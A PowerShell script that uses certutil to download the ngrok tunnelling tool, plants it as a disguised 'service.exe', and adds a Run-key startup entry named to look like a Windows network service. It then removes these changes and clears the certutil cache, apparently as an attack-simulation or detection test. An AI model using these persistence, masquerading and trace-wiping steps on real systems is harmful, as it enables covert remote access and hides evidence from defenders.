$targetPath = "C:\Users\Public\service.exe"
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "NetworkConfigurationService"
$ngrokUrl = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip"
$tempDir = "$env:TEMP\NgrkTemp"
$success = $false

try {
    # Create temp directory
    New-Item -Path $tempDir -ItemType Directory -Force -ErrorAction Stop

    # Download archive
    $archivePath = "$tempDir\ngrok.zip"
    certutil -urlcache -split -f $ngrokUrl $archivePath 2>&1 | Out-Null
    if (-not (Test-Path $archivePath)) { throw "Archive download failed" }

    # Extract files
    Expand-Archive -Path $archivePath -DestinationPath $tempDir -Force -ErrorAction Stop
    $ngrokExePath = "$tempDir\ngrok.exe"
    if (-not (Test-Path $ngrokExePath)) { throw "Archive extraction failed" }

    # Copy executable
    Copy-Item -Path $ngrokExePath -Destination $targetPath -Force -ErrorAction Stop
    if (-not (Test-Path $targetPath)) { throw "File copy failed" }

    # Add to startup
    $null = New-ItemProperty -Path $regPath -Name $regName -Value $targetPath -PropertyType String -Force -ErrorAction Stop
    if (-not (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue)) {
        throw "Registry modification failed"
    }

    $success = $true
}
catch {
    Write-Host "[ERROR] $($_.Exception.Message)" -ForegroundColor Red
    $success = $false
}
finally {
    # Cleanup routine
    try {
        # Remove downloaded file
        if (Test-Path $targetPath) {
            Remove-Item -Path $targetPath -Force -ErrorAction Stop
        }

        # Remove registry entry
        if (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue) {
            Remove-ItemProperty -Path $regPath -Name $regName -Force -ErrorAction Stop
        }

        # Clean temp files
        if (Test-Path $tempDir) {
            Remove-Item -Path $tempDir -Recurse -Force -ErrorAction Stop
        }

        # Clear certutil cache
        certutil -urlcache $ngrokUrl delete 2>&1 | Out-Null
        certutil -urlcache * delete 2>&1 | Out-Null
    }
    catch {
        Write-Host "[CLEANUP ERROR] $($_.Exception.Message)" -ForegroundColor DarkYellow
    }

    # Result output
    if ($success) {
        Write-Output "SUCCESS: Operation completed and system restored"
    } else {
        Write-Output "FAILED: Operation aborted with errors"
    }
}